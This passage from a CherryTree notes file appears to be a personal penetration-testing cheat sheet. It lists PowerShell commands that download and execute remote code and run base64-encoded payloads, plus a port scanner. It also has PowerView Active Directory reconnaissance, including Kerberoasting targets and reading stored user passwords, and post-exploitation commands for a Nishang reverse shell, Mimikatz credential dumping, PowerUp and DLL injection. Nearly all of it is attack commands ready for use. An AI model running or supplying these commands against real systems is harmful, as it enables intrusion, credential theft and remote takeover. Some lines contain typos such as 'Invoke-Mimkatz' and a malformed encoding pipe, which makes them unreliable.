        <codebox char_offset="0" justification="left" frame_width="150" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">iex (New-Object Net.Webclient).DownloadString(‘remote_file’​) #Downloads and executes file
Invoke-WebRequest -Uri ​target ​-OutFile filename #Downloads file
var = ​New-Object System.Xml.XmlDocument;var.​Load(“​remote_xml_file”);iex var.​command.a.execute #executes PS within xml file
Write-Host variable #Output contents of variable
cat ​file ​| ​-iconv --to-code UTF-16LE | base 64 #b64 encode powershell
powershell ​options ​-enc ​base64_string #executes base64</codebox>
      </node>
      <node name="Recon" unique_id="38" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652230679" ts_lastsave="1652231850">
        <rich_text scale="h2">Basic</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">Powersploit</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="6" justification="left" frame_width="150" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">$ports=(​ports​); $ip​=”​ip”​; ​foreach ($port in $ports) {try{$socket=New-Object System.Net.Sockets.TcpClient($ip,$port);} catch {}; if ($socket -eq $null) {echo $ip”:”$port” - Closed”;}else(echo $ip”:”$port” - Open”; $socket = $null;}} #port scan\</codebox>
        <codebox char_offset="21" justification="left" frame_width="150" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">Get-NetDomain #Basic domain info
#User info
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount #Basic user enabled info
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN #Kerberoastable users
#Groups info
Get-NetGroup | select samaccountname, admincount, description
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=EGOTISTICAL-BANK,DC=local' | %{ $_.SecurityIdentifier } | Convert-SidToName #Get AdminSDHolders
#Computers
Get-NetComputer | select samaccountname, operatingsystem
Get-NetComputer -Unconstrained | select samaccountname #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth | select samaccountname #Find computers with Constrained Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups
#Shares
Find-DomainShare -CheckShareAccess #Search readable shares
#Domain trusts
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
#LHF
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess
#Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.
Invoke-UserHunter -CheckAccess
#Find interesting ACLs
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | fl</codebox>
      </node>
      <node name="Post-Exploitation" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652230679" ts_lastsave="1652231835">
        <rich_text scale="h2">Nishang</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">PowerUp.ps1</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">PowerSploit</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="8" justification="left" frame_width="150" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">Invoke-PowerShellTcp -Reverse -IPAddress listen_ip ​-Port ​listener_port #ReverseShell
Invoke-Mimkatz -DumpCreds</codebox>
        <codebox char_offset="23" justification="left" frame_width="150" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">Import-Module ​power_up_module​; Invoke-AllChecks</codebox>
        <codebox char_offset="38" justification="left" frame_width="150" frame_height="50" width_in_pixels="1" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="1">Invoke-DLLInjection -ProcessID target_process dll_file</codebox>
      </node>
    </node>
  </node>
</cherrytree>
